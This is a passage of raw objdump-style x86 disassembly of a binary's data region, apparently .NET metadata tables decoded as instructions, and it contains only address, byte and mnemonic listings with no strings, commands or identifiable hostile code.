  403195:	00 01                	add    %al,(%ecx)
  403197:	00 07                	add    %al,(%edi)
  403199:	0a 00                	or     (%eax),%al
  40319b:	00 02                	add    %al,(%edx)
  40319d:	00 ea                	add    %ch,%dl
  40319f:	06                   	push   %es
  4031a0:	00 00                	add    %al,(%eax)
  4031a2:	03 00                	add    (%eax),%eax
  4031a4:	4a                   	dec    %edx
  4031a5:	0a 00                	or     (%eax),%al
  4031a7:	00 01                	add    %al,(%ecx)
  4031a9:	00 07                	add    %al,(%edi)
  4031ab:	0a 00                	or     (%eax),%al
  4031ad:	00 02                	add    %al,(%edx)
  4031af:	00 ea                	add    %ch,%dl
  4031b1:	06                   	push   %es
  4031b2:	00 00                	add    %al,(%eax)
  4031b4:	03 00                	add    (%eax),%eax
  4031b6:	4a                   	dec    %edx
  4031b7:	0a 00                	or     (%eax),%al
  4031b9:	00 01                	add    %al,(%ecx)
  4031bb:	00 fd                	add    %bh,%ch
  4031bd:	06                   	push   %es
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	01 00                	add    %eax,(%eax)
  4031c2:	fd                   	std
  4031c3:	06                   	push   %es
  4031c4:	00 00                	add    %al,(%eax)
  4031c6:	01 00                	add    %eax,(%eax)
  4031c8:	fd                   	std
  4031c9:	06                   	push   %es
  4031ca:	00 00                	add    %al,(%eax)
  4031cc:	01 00                	add    %eax,(%eax)
  4031ce:	fd                   	std
  4031cf:	06                   	push   %es
  4031d0:	00 00                	add    %al,(%eax)
  4031d2:	01 00                	add    %eax,(%eax)
  4031d4:	24 04                	and    $0x4,%al
  4031d6:	00 00                	add    %al,(%eax)
  4031d8:	01 00                	add    %eax,(%eax)
  4031da:	24 04                	and    $0x4,%al
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	01 00                	add    %eax,(%eax)
  4031e0:	84 06                	test   %al,(%esi)
  4031e2:	00 00                	add    %al,(%eax)
  4031e4:	01 00                	add    %eax,(%eax)
  4031e6:	84 06                	test   %al,(%esi)
  4031e8:	00 00                	add    %al,(%eax)
  4031ea:	01 00                	add    %eax,(%eax)
  4031ec:	84 06                	test   %al,(%esi)
  4031ee:	00 00                	add    %al,(%eax)
  4031f0:	01 00                	add    %eax,(%eax)
  4031f2:	84 06                	test   %al,(%esi)
  4031f4:	00 00                	add    %al,(%eax)
  4031f6:	01 00                	add    %eax,(%eax)
  4031f8:	84 06                	test   %al,(%esi)
  4031fa:	00 00                	add    %al,(%eax)
  4031fc:	01 00                	add    %eax,(%eax)
  4031fe:	84 06                	test   %al,(%esi)
  403200:	00 00                	add    %al,(%eax)
  403202:	01 00                	add    %eax,(%eax)
  403204:	84 06                	test   %al,(%esi)
  403206:	00 00                	add    %al,(%eax)
  403208:	01 00                	add    %eax,(%eax)
  40320a:	84 06                	test   %al,(%esi)
  40320c:	00 00                	add    %al,(%eax)
  40320e:	01 00                	add    %eax,(%eax)
  403210:	84 06                	test   %al,(%esi)
  403212:	00 00                	add    %al,(%eax)
  403214:	01 00                	add    %eax,(%eax)
  403216:	84 06                	test   %al,(%esi)
  403218:	00 00                	add    %al,(%eax)
  40321a:	01 00                	add    %eax,(%eax)
  40321c:	84 06                	test   %al,(%esi)
  40321e:	00 00                	add    %al,(%eax)
  403220:	01 00                	add    %eax,(%eax)
  403222:	84 06                	test   %al,(%esi)
  403224:	00 00                	add    %al,(%eax)
  403226:	01 00                	add    %eax,(%eax)
  403228:	84 06                	test   %al,(%esi)
  40322a:	00 00                	add    %al,(%eax)
  40322c:	01 00                	add    %eax,(%eax)
  40322e:	84 06                	test   %al,(%esi)
  403230:	00 00                	add    %al,(%eax)
  403232:	01 00                	add    %eax,(%eax)
  403234:	84 06                	test   %al,(%esi)
  403236:	00 00                	add    %al,(%eax)
  403238:	01 00                	add    %eax,(%eax)
  40323a:	84 06                	test   %al,(%esi)
  40323c:	00 00                	add    %al,(%eax)
  40323e:	01 00                	add    %eax,(%eax)
  403240:	84 06                	test   %al,(%esi)
  403242:	00 00                	add    %al,(%eax)
  403244:	01 00                	add    %eax,(%eax)
  403246:	84 06                	test   %al,(%esi)
  403248:	00 00                	add    %al,(%eax)
  40324a:	01 00                	add    %eax,(%eax)
  40324c:	84 06                	test   %al,(%esi)
  40324e:	00 00                	add    %al,(%eax)
  403250:	01 00                	add    %eax,(%eax)
  403252:	84 06                	test   %al,(%esi)
  403254:	00 00                	add    %al,(%eax)
  403256:	01 00                	add    %eax,(%eax)
  403258:	84 06                	test   %al,(%esi)
  40325a:	00 00                	add    %al,(%eax)
  40325c:	01 00                	add    %eax,(%eax)
  40325e:	84 06                	test   %al,(%esi)
  403260:	00 00                	add    %al,(%eax)
  403262:	01 00                	add    %eax,(%eax)
  403264:	84 06                	test   %al,(%esi)
  403266:	00 00                	add    %al,(%eax)
  403268:	01 00                	add    %eax,(%eax)
  40326a:	84 06                	test   %al,(%esi)
  40326c:	00 00                	add    %al,(%eax)
  40326e:	01 00                	add    %eax,(%eax)
  403270:	84 06                	test   %al,(%esi)
  403272:	05 00 6d 00 06       	add    $0x6006d00,%eax
  403277:	00 6d 00             	add    %ch,0x0(%ebp)
  40327a:	09 00                	or     %eax,(%eax)
  40327c:	15 08 01 00 11       	adc    $0x11000108,%eax
  403281:	00 15 08 05 00 19    	add    %dl,0x19000508
  403287:	00 15 08 01 00 21    	add    %dl,0x21000108
  40328d:	00 15 08 0a 00 31    	add    %dl,0x31000a08
  403293:	00 15 08 10 00 39    	add    %dl,0x39001008
  403299:	00 15 08 10 00 41    	add    %dl,0x41001008
  40329f:	00 15 08 10 00 49    	add    %dl,0x49001008
  4032a5:	00 15 08 10 00 51    	add    %dl,0x51001008
  4032ab:	00 15 08 10 00 59    	add    %dl,0x59001008
  4032b1:	00 15 08 10 00 61    	add    %dl,0x61001008
  4032b7:	00 15 08 10 00 69    	add    %dl,0x69001008
  4032bd:	00 15 08 15 00 71    	add    %dl,0x71001508
  4032c3:	00 15 08 10 00 79    	add    %dl,0x79001008
  4032c9:	00 15 08 10 00 81    	add    %dl,0x81001008
  4032cf:	00 15 08 10 00 a1    	add    %dl,0xa1001008
  4032d5:	00 15 08 1a 00 a9    	add    %dl,0xa9001a08
  4032db:	00 15 08 01 00 d1    	add    %dl,0xd1000108
  4032e1:	00 15 08 01 00 d9    	add    %dl,0xd9000108
  4032e7:	00 76 0a             	add    %dh,0xa(%esi)
  4032ea:	01 00                	add    %eax,(%eax)
  4032ec:	d9 00                	flds   (%eax)
  4032ee:	14 04                	adc    $0x4,%al
  4032f0:	20 00                	and    %al,(%eax)
  4032f2:	11 01                	adc    %eax,(%ecx)
  4032f4:	15 08 01 00 31       	adc    $0x31000108,%eax
  4032f9:	01 15 08 26 00 91    	add    %edx,0x91002608
  4032ff:	00 15 08 01 00 91    	add    %dl,0x91000108
  403305:	00 89 03 33 00 39    	add    %cl,0x39003303(%ecx)
  40330b:	01 48 04             	add    %ecx,0x4(%eax)
  40330e:	01 00                	add    %eax,(%eax)
  403310:	41                   	inc    %ecx
  403311:	01 64 0a 39          	add    %esp,0x39(%edx,%ecx,1)
  403315:	00 49 01             	add    %cl,0x1(%ecx)
  403318:	6e                   	outsb  %ds:(%esi),(%dx)
  403319:	07                   	pop    %es
  40331a:	40                   	inc    %eax
  40331b:	00 51 01             	add    %dl,0x1(%ecx)
  40331e:	7f 04                	jg     0x403324
  403320:	45                   	inc    %ebp
  403321:	00 59 01             	add    %bl,0x1(%ecx)
  403324:	9e                   	sahf
  403325:	03 45 00             	add    0x0(%ebp),%eax
  403328:	59                   	pop    %ecx
  403329:	01 f7                	add    %esi,%edi
  40332b:	03 45 00             	add    0x0(%ebp),%eax
  40332e:	59                   	pop    %ecx
  40332f:	01 ee                	add    %ebp,%esi
  403331:	03 4a 00             	add    0x0(%edx),%ecx
  403334:	59                   	pop    %ecx
  403335:	01 84 07 4e 00 59 01 	add    %eax,0x159004e(%edi,%eax,1)
  40333c:	bc 0a 52 00 89       	mov    $0x8900520a,%esp
  403341:	00 15 08 01 00 0c    	add    %dl,0xc000108
  403347:	00 56 04             	add    %dl,0x4(%esi)
  40334a:	64 00 0c 00          	add    %cl,%fs:(%eax,%eax,1)
  40334e:	64 0a 6d 00          	or     %fs:0x0(%ebp),%ch
  403352:	0c 00                	or     $0x0,%al
  403354:	e1 06                	loope  0x40335c
  403356:	7a 00                	jp     0x403358
  403358:	c1 00 15             	roll   $0x15,(%eax)
  40335b:	08 01                	or     %al,(%ecx)
  40335d:	00 c1                	add    %al,%cl
  40335f:	00 6a 09             	add    %ch,0x9(%edx)
  403362:	a9 00 71 01 29       	test   $0x29017100,%eax
  403367:	01 33                	add    %esi,(%ebx)
  403369:	00 c1                	add    %al,%cl
  40336b:	00 06                	add    %al,(%esi)
  40336d:	01 af 00 14 00 d3    	add    %ebp,-0x2cffec00(%edi)
  403373:	09 c0                	or     %eax,%eax
  403375:	00 b9 00 24 0a c5    	add    %bh,-0x3af5dc00(%ecx)
  40337b:	00 c9                	add    %cl,%cl
  40337d:	00 e9                	add    %ch,%cl
  40337f:	00 ca                	add    %cl,%dl
  403381:	00 79 01             	add    %bh,0x1(%ecx)
  403384:	ce                   	into
  403385:	09 01                	or     %eax,(%ecx)
  403387:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40338a:	d3 09                	rorl   %cl,(%ecx)
  40338c:	c0 00 81             	rolb   $0x81,(%eax)
  40338f:	01 b1 09 d8 00 24    	add    %esi,0x2400d809(%ecx)
  403395:	00 07                	add    %al,(%edi)
  403397:	08 f1                	or     %dh,%cl
  403399:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40339c:	18 0a                	sbb    %cl,(%edx)
  40339e:	c0 00 89             	rolb   $0x89,(%eax)
  4033a1:	01 aa 09 03 01 89    	add    %ebp,-0x76fefcf7(%edx)
  4033a7:	01 aa 09 09 01 91    	add    %ebp,-0x6efef6f7(%edx)
  4033ad:	01 8e 00 0f 01 99    	add    %ecx,-0x66fef100(%esi)
  4033b3:	01 15 08 15 01 c1    	add    %edx,0xc1011508
  4033b9:	00 19                	add    %bl,(%ecx)
  4033bb:	01 1e                	add    %ebx,(%esi)
  4033bd:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  4033c0:	76 0a                	jbe    0x4033cc
  4033c2:	2a 01                	sub    (%ecx),%al
  4033c4:	34 00                	xor    $0x0,%al
  4033c6:	07                   	pop    %es
  4033c7:	08 f1                	or     %dh,%cl
  4033c9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4033cc:	18 0a                	sbb    %cl,(%edx)
  4033ce:	c0 00 c1             	rolb   $0xc1,(%eax)
  4033d1:	00 dd                	add    %bl,%ch
  4033d3:	00 af 00 3c 00 76    	add    %ch,0x76003c00(%edi)
  4033d9:	0a 2a                	or     (%edx),%ch
  4033db:	01 44 00 07          	add    %eax,0x7(%eax,%eax,1)
  4033df:	08 f1                	or     %dh,%cl
  4033e1:	00 4c 00 18          	add    %cl,0x18(%eax,%eax,1)
  4033e5:	0a c0                	or     %al,%al
  4033e7:	00 89 01 aa 09 9b    	add    %cl,-0x64f655ff(%ecx)
  4033ed:	01 c1                	add    %eax,%ecx
  4033ef:	00 0f                	add    %cl,(%edi)
  4033f1:	01 1e                	add    %ebx,(%esi)
  4033f3:	01 4c 00 76          	add    %ecx,0x76(%eax,%eax,1)
  4033f7:	0a 2a                	or     (%edx),%ch
  4033f9:	01 01                	add    %eax,(%ecx)
  4033fb:	01 15 08 10 00 a1    	add    %edx,0xa1001008
  403401:	01 15 08 10 00 09    	add    %edx,0x9001008
  403407:	01 15 08 ba 01 09    	add    %edx,0x901ba08
  40340d:	01 30                	add    %esi,(%eax)
  40340f:	0a c4                	or     %ah,%al
  403411:	01 b9 00 15 08 01    	add    %edi,0x1081500(%ecx)
  403417:	00 c1                	add    %al,%cl
  403419:	00 d3                	add    %dl,%bl
  40341b:	00 ca                	add    %cl,%dl
  40341d:	01 14 00             	add    %edx,(%eax,%eax,1)
  403420:	d8 07                	fadds  (%edi)
  403422:	d6                   	salc
  403423:	01 54 00 44          	add    %edx,0x44(%eax,%eax,1)
  403427:	01 2a                	add    %ebp,(%edx)
  403429:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40342c:	2d 01 e6 01 54       	sub    $0x5401e601,%eax
  403431:	00 de                	add    %bl,%dh
  403433:	09 c0                	or     %eax,%eax
  403435:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403438:	42                   	inc    %edx
  403439:	07                   	pop    %es
  40343a:	fc                   	cld
  40343b:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40343e:	e8 09 02 02 2e       	call   0x2e42364c
  403443:	00 0b                	add    %cl,(%ebx)
  403445:	00 2d 03 2e 00 13    	add    %ch,0x13002e03
  40344b:	00 32                	add    %dh,(%edx)
  40344d:	03 2e                	add    (%esi),%ebp
  40344f:	00 1b                	add    %bl,(%ebx)
  403451:	00 3b                	add    %bh,(%ebx)
  403453:	03 2e                	add    (%esi),%ebp
  403455:	00 23                	add    %ah,(%ebx)
  403457:	00 5a 03             	add    %bl,0x3(%edx)
  40345a:	2e 00 2b             	add    %ch,%cs:(%ebx)
  40345d:	00 63 03             	add    %ah,0x3(%ebx)
  403460:	2e 00 33             	add    %dh,%cs:(%ebx)
  403463:	00 7c 03 2e          	add    %bh,0x2e(%ebx,%eax,1)
  403467:	00 3b                	add    %bh,(%ebx)
  403469:	00 7c 03 2e          	add    %bh,0x2e(%ebx,%eax,1)
  40346d:	00 43 00             	add    %al,0x0(%ebx)
  403470:	7c 03                	jl     0x403475
  403472:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  403476:	63 03                	arpl   %eax,(%ebx)
  403478:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  40347c:	82 03 2e             	addb   $0x2e,(%ebx)
  40347f:	00 5b 00             	add    %bl,0x0(%ebx)
  403482:	7c 03                	jl     0x403487
  403484:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  403488:	7c 03                	jl     0x40348d
  40348a:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40348e:	9a 03 2e 00 73 00 c4 	lcall  $0xc400,$0x73002e03
  403495:	03 2e                	add    (%esi),%ebp
  403497:	00 7b 00             	add    %bh,0x0(%ebx)
  40349a:	d1 03                	roll   $1,(%ebx)
  40349c:	60                   	pusha
  40349d:	00 83 00 1f 04 60    	add    %al,0x60041f00(%ebx)
  4034a3:	00 8b 00 2d 03 60    	add    %cl,0x60032d00(%ebx)
  4034a9:	00 0b                	add    %cl,(%ebx)
  4034ab:	00 2d 03 63 00 0b    	add    %ch,0xb006303
  4034b1:	00 2d 03 80 00 83    	add    %ch,0x83008003
  4034b7:	00 52 04             	add    %dl,0x4(%edx)
  4034ba:	80 00 8b             	addb   $0x8b,(%eax)
  4034bd:	00 2d 03 80 00 0b    	add    %ch,0xb008003
  4034c3:	00 2d 03 a3 00 93    	add    %ch,0x9300a303
  4034c9:	00 2d 03 c3 00 93    	add    %ch,0x9300c303
  4034cf:	00 2d 03 80 01 ab    	add    %ch,0xab018003
  4034d5:	00 2d 03 e0 01 ab    	add    %ch,0xab01e003
  4034db:	00 2d 03 00 02 93    	add    %ch,0x93020003
  4034e1:	00 2d 03 20 02 93    	add    %ch,0x93022003
  4034e7:	00 2d 03 40 02 93    	add    %ch,0x93024003
  4034ed:	00 2d 03 60 02 93    	add    %ch,0x93026003
  4034f3:	00 2d 03 80 02 93    	add    %ch,0x93028003
  4034f9:	00 2d 03 a0 02 93    	add    %ch,0x9302a003
  4034ff:	00 2d 03 a1 02 93    	add    %ch,0x9302a103
  403505:	00 2d 03 a1 02 b3    	add    %ch,0xb302a103
  40350b:	00 83 04 c0 02 93    	add    %al,-0x6cfd3ffc(%ebx)
  403511:	00 2d 03 c1 02 93    	add    %ch,0x9302c103
  403517:	00 2d 03 c1 02 b3    	add    %ch,0xb302c103
  40351d:	00 83 04 e0 02 93    	add    %al,-0x6cfd1ffc(%ebx)
  403523:	00 2d 03 e1 02 93    	add    %ch,0x9302e103
  403529:	00 2d 03 e1 02 b3    	add    %ch,0xb302e103
  40352f:	00 83 04 00 03 93    	add    %al,-0x6cfcfffc(%ebx)
  403535:	00 2d 03 01 03 93    	add    %ch,0x93030103
  40353b:	00 2d 03 01 03 b3    	add    %ch,0xb3030103
  403541:	00 83 04 20 03 93    	add    %al,-0x6cfcdffc(%ebx)
  403547:	00 2d 03 21 03 93    	add    %ch,0x93032103
  40354d:	00 2d 03 21 03 b3    	add    %ch,0xb3032103
  403553:	00 83 04 41 03 93    	add    %al,-0x6cfcbefc(%ebx)
  403559:	00 2d 03 41 03 b3    	add    %ch,0xb3034103
  40355f:	00 83 04 60 03 93    	add    %al,-0x6cfc9ffc(%ebx)
  403565:	00 2d 03 61 03 93    	add    %ch,0x93036103
  40356b:	00 2d 03 61 03 b3    	add    %ch,0xb3036103
  403571:	00 83 04 80 03 93    	add    %al,-0x6cfc7ffc(%ebx)
  403577:	00 2d 03 81 03 93    	add    %ch,0x93038103
  40357d:	00 2d 03 81 03 b3    	add    %ch,0xb3038103
  403583:	00 83 04 a0 03 93    	add    %al,-0x6cfc5ffc(%ebx)
  403589:	00 2d 03 a1 03 93    	add    %ch,0x9303a103
  40358f:	00 2d 03 a1 03 b3    	add    %ch,0xb303a103
  403595:	00 83 04 c0 03 93    	add    %al,-0x6cfc3ffc(%ebx)
  40359b:	00 2d 03 c1 03 93    	add    %ch,0x9303c103
  4035a1:	00 2d 03 c1 03 b3    	add    %ch,0xb303c103
  4035a7:	00 83 04 e0 03 93    	add    %al,-0x6cfc1ffc(%ebx)
  4035ad:	00 2d 03 e1 03 93    	add    %ch,0x9303e103
  4035b3:	00 2d 03 e1 03 b3    	add    %ch,0xb303e103
  4035b9:	00 83 04 00 04 93    	add    %al,-0x6cfbfffc(%ebx)
  4035bf:	00 2d 03 01 04 93    	add    %ch,0x93040103
  4035c5:	00 2d 03 01 04 b3    	add    %ch,0xb3040103
  4035cb:	00 83 04 20 04 93    	add    %al,-0x6cfbdffc(%ebx)
  4035d1:	00 2d 03 21 04 93    	add    %ch,0x93042103
  4035d7:	00 2d 03 21 04 b3    	add    %ch,0xb3042103
  4035dd:	00 83 04 40 04 93    	add    %al,-0x6cfbbffc(%ebx)
  4035e3:	00 2d 03 41 04 93    	add    %ch,0x93044103
  4035e9:	00 2d 03 41 04 b3    	add    %ch,0xb3044103
  4035ef:	00 83 04 61 04 93    	add    %al,-0x6cfb9efc(%ebx)
  4035f5:	00 2d 03 61 04 b3    	add    %ch,0xb3046103
  4035fb:	00 83 04 80 04 93    	add    %al,-0x6cfb7ffc(%ebx)
  403601:	00 2d 03 81 04 93    	add    %ch,0x93048103
  403607:	00 2d 03 81 04 b3    	add    %ch,0xb3048103
  40360d:	00 83 04 a0 04 93    	add    %al,-0x6cfb5ffc(%ebx)
  403613:	00 2d 03 a1 04 93    	add    %ch,0x9304a103
  403619:	00 2d 03 a1 04 b3    	add    %ch,0xb304a103
  40361f:	00 83 04 c0 04 93    	add    %al,-0x6cfb3ffc(%ebx)
  403625:	00 2d 03 c1 04 93    	add    %ch,0x9304c103
  40362b:	00 2d 03 c1 04 b3    	add    %ch,0xb304c103
  403631:	00 83 04 e0 04 93    	add    %al,-0x6cfb1ffc(%ebx)
  403637:	00 2d 03 e1 04 93    	add    %ch,0x9304e103
  40363d:	00 2d 03 e1 04 b3    	add    %ch,0xb304e103
  403643:	00 83 04 00 05 93    	add    %al,-0x6cfafffc(%ebx)
  403649:	00 2d 03 01 05 93    	add    %ch,0x93050103
  40364f:	00 2d 03 01 05 b3    	add    %ch,0xb3050103
  403655:	00 83 04 20 05 93    	add    %al,-0x6cfadffc(%ebx)
  40365b:	00 2d 03 21 05 93    	add    %ch,0x93052103
  403661:	00 2d 03 21 05 b3    	add    %ch,0xb3052103
  403667:	00 83 04 40 05 93    	add    %al,-0x6cfabffc(%ebx)
  40366d:	00 2d 03 41 05 93    	add    %ch,0x93054103
  403673:	00 2d 03 41 05 b3    	add    %ch,0xb3054103
  403679:	00 83 04 60 05 93    	add    %al,-0x6cfa9ffc(%ebx)
  40367f:	00 2d 03 61 05 93    	add    %ch,0x93056103
  403685:	00 2d 03 61 05 b3    	add    %ch,0xb3056103
  40368b:	00 83 04 80 05 93    	add    %al,-0x6cfa7ffc(%ebx)
  403691:	00 2d 03 81 05 93    	add    %ch,0x93058103
  403697:	00 2d 03 81 05 b3    	add    %ch,0xb3058103
  40369d:	00 83 04 a0 05 93    	add    %al,-0x6cfa5ffc(%ebx)
  4036a3:	00 2d 03 a1 05 93    	add    %ch,0x9305a103
  4036a9:	00 2d 03 a1 05 b3    	add    %ch,0xb305a103
  4036af:	00 83 04 e0 05 93    	add    %al,-0x6cfa1ffc(%ebx)
  4036b5:	00 2d 03 00 06 93    	add    %ch,0x93060003
  4036bb:	00 2d 03 20 06 93    	add    %ch,0x93062003
  4036c1:	00 2d 03 40 06 93    	add    %ch,0x93064003
  4036c7:	00 2d 03 60 06 93    	add    %ch,0x93066003
  4036cd:	00 2d 03 80 06 93    	add    %ch,0x93068003
  4036d3:	00 2d 03 a0 06 93    	add    %ch,0x9306a003
  4036d9:	00 2d 03 c0 06 93    	add    %ch,0x9306c003
  4036df:	00 2d 03 00 07 93    	add    %ch,0x93070003
  4036e5:	00 2d 03 20 07 93    	add    %ch,0x93072003
  4036eb:	00 2d 03 40 07 93    	add    %ch,0x93074003
  4036f1:	00 2d 03 60 07 93    	add    %ch,0x93076003
  4036f7:	00 2d 03 80 07 93    	add    %ch,0x93078003
  4036fd:	00 2d 03 a0 07 93    	add    %ch,0x9307a003
  403703:	00 2d 03 c0 07 93    	add    %ch,0x9307c003
  403709:	00 2d 03 e0 07 93    	add    %ch,0x9307e003
  40370f:	00 2d 03 00 08 93    	add    %ch,0x93080003
  403715:	00 2d 03 20 08 93    	add    %ch,0x93082003
  40371b:	00 2d 03 40 08 93    	add    %ch,0x93084003
  403721:	00 2d 03 60 08 93    	add    %ch,0x93086003
  403727:	00 2d 03 a0 08 93    	add    %ch,0x9308a003
  40372d:	00 2d 03 c0 08 93    	add    %ch,0x9308c003
  403733:	00 2d 03 2d 00 58    	add    %ch,0x58002d03
  403739:	00 83 00 8d 00 2e    	add    %al,0x2e008d00(%ebx)
  40373f:	01 64 01 a2          	add    %esp,-0x5e(%ecx,%eax,1)
  403743:	01 aa 01 08 02 07    	add    %ebp,0x7020801(%edx)
  403749:	00 01                	add    %al,(%ecx)
  40374b:	00 08                	add    %cl,(%eax)
  40374d:	00 06                	add    %al,(%esi)
  40374f:	00 09                	add    %cl,(%ecx)
  403751:	00 0a                	add    %cl,(%edx)
  403753:	00 0a                	add    %cl,(%edx)
  403755:	00 0f                	add    %cl,(%edi)
  403757:	00 0b                	add    %cl,(%ebx)
  403759:	00 13                	add    %dl,(%ebx)
  40375b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40375e:	19 00                	sbb    %eax,(%eax)
  403760:	00 00                	add    %al,(%eax)
  403762:	87 01                	xchg   %eax,(%ecx)
  403764:	fb                   	sti
  403765:	02 00                	add    (%eax),%al
  403767:	00 e5                	add    %ah,%ch
  403769:	03 fb                	add    %ebx,%edi
  40376b:	02 00                	add    (%eax),%al
  40376d:	00 99 07 fb 02 00    	add    %bl,0x2fb07(%ecx)
  403773:	00 f9                	add    %bh,%cl
  403775:	07                   	pop    %es
  403776:	fb                   	sti
  403777:	02 00                	add    (%eax),%al
  403779:	00 db                	add    %bl,%bl
  40377b:	08 ff                	or     %bh,%bh
  40377d:	02 00                	add    (%eax),%al
  40377f:	00 87 01 fb 02 00    	add    %al,0x2fb01(%edi)
  403785:	00 43 04             	add    %al,0x4(%ebx)
  403788:	ff 02                	incl   (%edx)
  40378a:	00 00                	add    %al,(%eax)
  40378c:	cb                   	lret
  40378d:	03 03                	add    (%ebx),%eax
  40378f:	03 00                	add    (%eax),%eax
  403791:	00 d3                	add    %dl,%bl
  403793:	07                   	pop    %es
  403794:	07                   	pop    %es
  403795:	03 00                	add    (%eax),%eax
  403797:	00 87 01 fb 02 00    	add    %al,0x2fb01(%edi)
  40379d:	00 e5                	add    %ah,%ch
  40379f:	03 fb                	add    %ebx,%edi
  4037a1:	02 00                	add    (%eax),%al
  4037a3:	00 99 07 fb 02 00    	add    %bl,0x2fb07(%ecx)
  4037a9:	00 f9                	add    %bh,%cl
  4037ab:	07                   	pop    %es
  4037ac:	fb                   	sti
  4037ad:	02 00                	add    (%eax),%al
  4037af:	00 db                	add    %bl,%bl
  4037b1:	08 ff                	or     %bh,%bh
  4037b3:	02 00                	add    (%eax),%al
  4037b5:	00 87 01 fb 02 00    	add    %al,0x2fb01(%edi)
  4037bb:	00 43 04             	add    %al,0x4(%ebx)
  4037be:	ff 02                	incl   (%edx)
  4037c0:	00 00                	add    %al,(%eax)
  4037c2:	6c                   	insb   (%dx),%es:(%edi)
  4037c3:	01 03                	add    %eax,(%ebx)
  4037c5:	03 00                	add    (%eax),%eax
  4037c7:	00 9f 09 0c 03 00    	add    %bl,0x30c09(%edi)
  4037cd:	00 87 01 fb 02 00    	add    %al,0x2fb01(%edi)
  4037d3:	00 e9                	add    %ch,%cl
  4037d5:	03 fb                	add    %ebx,%edi
  4037d7:	02 00                	add    (%eax),%al
  4037d9:	00 15 07 fb 02 00    	add    %dl,0x2fb07
  4037df:	00 bb 07 16 03 00    	add    %bh,0x31607(%ebx)
  4037e5:	00 27                	add    %ah,(%edi)
  4037e7:	09 fb                	or     %edi,%ebx
  4037e9:	02 00                	add    (%eax),%al
  4037eb:	00 bd 08 1a 03 00    	add    %bh,0x31a08(%ebp)
  4037f1:	00 b4 0a 23 03 02 00 	add    %dh,0x20323(%edx,%ecx,1)
  4037f8:	10 00                	adc    %al,(%eax)
  4037fa:	03 00                	add    (%eax),%eax
  4037fc:	01 00                	add    %eax,(%eax)
  4037fe:	11 00                	adc    %eax,(%eax)
  403800:	03 00                	add    (%eax),%eax
  403802:	02 00                	add    (%eax),%al
  403804:	12 00                	adc    (%eax),%al
  403806:	05 00 01 00 13       	add    $0x13000100,%eax
  40380b:	00 05 00 02 00 14    	add    %al,0x14000200
  403811:	00 07                	add    %al,(%edi)
  403813:	00 01                	add    %al,(%ecx)
  403815:	00 15 00 07 00 02    	add    %dl,0x2000700
  40381b:	00 16                	add    %dl,(%esi)
  40381d:	00 09                	add    %cl,(%ecx)
  40381f:	00 01                	add    %al,(%ecx)
  403821:	00 17                	add    %dl,(%edi)
  403823:	00 09                	add    %cl,(%ecx)
  403825:	00 02                	add    %al,(%edx)
  403827:	00 18                	add    %bl,(%eax)
  403829:	00 0b                	add    %cl,(%ebx)
  40382b:	00 01                	add    %al,(%ecx)
  40382d:	00 19                	add    %bl,(%ecx)
  40382f:	00 0b                	add    %cl,(%ebx)
  403831:	00 02                	add    %al,(%edx)
  403833:	00 1b                	add    %bl,(%ebx)
  403835:	00 0d 00 01 00 1c    	add    %cl,0x1c000100
  40383b:	00 0d 00 02 00 1d    	add    %cl,0x1d000200
  403841:	00 0f                	add    %cl,(%edi)
  403843:	00 01                	add    %al,(%ecx)
  403845:	00 1e                	add    %bl,(%esi)
  403847:	00 0f                	add    %cl,(%edi)
  403849:	00 02                	add    %al,(%edx)
  40384b:	00 1f                	add    %bl,(%edi)
  40384d:	00 11                	add    %dl,(%ecx)
  40384f:	00 01                	add    %al,(%ecx)
  403851:	00 20                	add    %ah,(%eax)
  403853:	00 11                	add    %dl,(%ecx)
  403855:	00 02                	add    %al,(%edx)
  403857:	00 21                	add    %ah,(%ecx)
  403859:	00 13                	add    %dl,(%ebx)
  40385b:	00 01                	add    %al,(%ecx)
  40385d:	00 22                	add    %ah,(%edx)
  40385f:	00 13                	add    %dl,(%ebx)
  403861:	00 02                	add    %al,(%edx)
  403863:	00 24 00             	add    %ah,(%eax,%eax,1)
  403866:	15 00 01 00 25       	adc    $0x25000100,%eax
  40386b:	00 15 00 02 00 26    	add    %dl,0x26000200
  403871:	00 17                	add    %dl,(%edi)
  403873:	00 01                	add    %al,(%ecx)
  403875:	00 27                	add    %ah,(%edi)
  403877:	00 17                	add    %dl,(%edi)
  403879:	00 02                	add    %al,(%edx)
  40387b:	00 28                	add    %ch,(%eax)
  40387d:	00 19                	add    %bl,(%ecx)
  40387f:	00 01                	add    %al,(%ecx)
  403881:	00 29                	add    %ch,(%ecx)
  403883:	00 19                	add    %bl,(%ecx)
  403885:	00 02                	add    %al,(%edx)
  403887:	00 2a                	add    %ch,(%edx)
  403889:	00 1b                	add    %bl,(%ebx)
  40388b:	00 01                	add    %al,(%ecx)
  40388d:	00 2b                	add    %ch,(%ebx)
  40388f:	00 1b                	add    %bl,(%ebx)
  403891:	00 02                	add    %al,(%edx)
  403893:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403896:	1d 00 01 00 2d       	sbb    $0x2d000100,%eax
  40389b:	00 1d 00 02 00 2f    	add    %bl,0x2f000200
  4038a1:	00 1f                	add    %bl,(%edi)
  4038a3:	00 01                	add    %al,(%ecx)
  4038a5:	00 30                	add    %dh,(%eax)
  4038a7:	00 1f                	add    %bl,(%edi)
  4038a9:	00 02                	add    %al,(%edx)
  4038ab:	00 31                	add    %dh,(%ecx)
  4038ad:	00 21                	add    %ah,(%ecx)
  4038af:	00 01                	add    %al,(%ecx)
  4038b1:	00 32                	add    %dh,(%edx)
  4038b3:	00 21                	add    %ah,(%ecx)
  4038b5:	00 02                	add    %al,(%edx)
  4038b7:	00 33                	add    %dh,(%ebx)
  4038b9:	00 23                	add    %ah,(%ebx)
  4038bb:	00 01                	add    %al,(%ecx)
  4038bd:	00 34 00             	add    %dh,(%eax,%eax,1)
  4038c0:	23 00                	and    (%eax),%eax
